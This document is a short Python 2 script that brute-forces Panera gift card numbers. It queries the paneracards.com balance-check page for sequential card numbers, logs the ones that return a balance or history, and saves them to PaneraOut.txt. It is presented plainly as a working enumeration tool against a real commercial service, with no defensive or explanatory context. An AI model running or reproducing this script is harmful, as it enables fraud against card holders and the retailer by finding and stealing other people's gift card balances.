import urllib, urllib2
import thread
import os, time

panera = []
tested = []
checked = []

dicks = False
limit = 100  # CHANGE THIS - THIS IS THE AMOUNT OF TIMES IT TRIES BEFORE ENDING
_delay = 100  # Delay between checks, in milliseconds
step = 1 # Amount of numbers to add each time it checks

def _cPH(var):
        if var not in checked:
            get = urllib2.urlopen("https://www.paneracards.com/checkbalance_transhistory.aspx?cardNum=" + str(var))
            handleData = get.read()
            get.close()
            exist = 'No balance/history found for this card. Thank you.'
            if exist not in handleData:
                panera.append(var)
                print "[+] " + str(var)
            else:
                print "[-] " + str(var)
            tested.append(var)
            checked.append(var)

delay = int(_delay)/float(1000)

while not dicks:
    _var = raw_input("Starting number: ")
    try:
        _var = int(_var)
        dicks = not dicks
    except:
        print 'Not a valid number.'
    
while not limit == 0:
    _cPH(_var)
    _var += step
    limit -= 1
    time.sleep(delay)

print ""
print ""
print "Found " + str(len(panera)) + " working numbers."
print "Tested " + str(len(tested)) + "."
if len(panera) > 0:
    _file = open("PaneraOut.txt", "w")
    for i in panera:
        _file.write(i)
    _file.write("STOPPED ON " + str(_var))
    _file.close()
    print "Working numbers written to PaneraOut.txt in local directory."
raw_input()
    
